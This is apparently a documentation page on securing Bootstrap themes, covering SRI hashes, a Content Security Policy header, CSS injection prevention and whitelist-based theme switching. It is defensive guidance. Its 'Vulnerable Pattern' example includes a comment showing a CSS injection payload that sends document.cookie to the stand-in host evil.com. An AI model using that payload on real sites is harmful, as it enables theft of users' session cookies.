Theme Security

Secure Theme Patterns

CSP compliance, SRI hashes, input validation, and CSS injection prevention.

Subresource Integrity (SRI)

SRI hashes verify that CDN resources haven't been modified by a third party.

<!-- CORRECT: With SRI hash --> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YcnS/1p9l3+n8fJ1p5np3eP1cIRmTRVeL0e" crossorigin="anonymous"> <!-- DANGEROUS: Without SRI --> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"> // If CDN is compromised, malicious CSS could be injected

Content Security Policy

CSP headers restrict where styles, scripts, and other resources can be loaded from.

// Recommended CSP header for themed Bootstrap site Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; script-src 'self' https://cdn.jsdelivr.net; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
Note: Bootstrap's inline styles (from JS components) require 'unsafe-inline' in style-src. In production, consider using a nonce or hash instead.

CSS Injection Prevention

✕ Vulnerable Pattern 
// DANGEROUS: User input in CSS
const color = userInput; // "red; url(evil.com)"
element.style.color = color;

// CSS injection possible:
// background: url('https://evil.com/steal?data='
//   + document.cookie)
✓ Safe Pattern 
// SAFE: Whitelist + CSS variable
const ALLOWED_COLORS = {
  red: '#dc2626',
  blue: '#2563eb',
  green: '#059669',
};

const safe = ALLOWED_COLORS[userInput];
if (safe) {
  document.documentElement
    .style.setProperty(
      '--user-color', safe
    );
}

Safe Theme Switching Implementation

// SAFELY switch themes using data attributes // Never use innerHTML or eval() for theme switching const ALLOWED_THEMES = ['light', 'dark', 'blue', 'green']; function switchTheme(themeName) { // Validate against whitelist if (!ALLOWED_THEMES.includes(themeName)) { // Reject unknown themes console.warn('Invalid theme:', themeName); return; } // Use data attribute - safe from injection document.documentElement.setAttribute('data-bs-theme', themeName); // Store validated value localStorage.setItem('theme', themeName); } // Load saved theme with validation const saved = localStorage.getItem('theme'); if (ALLOWED_THEMES.includes(saved)) { switchTheme(saved); }
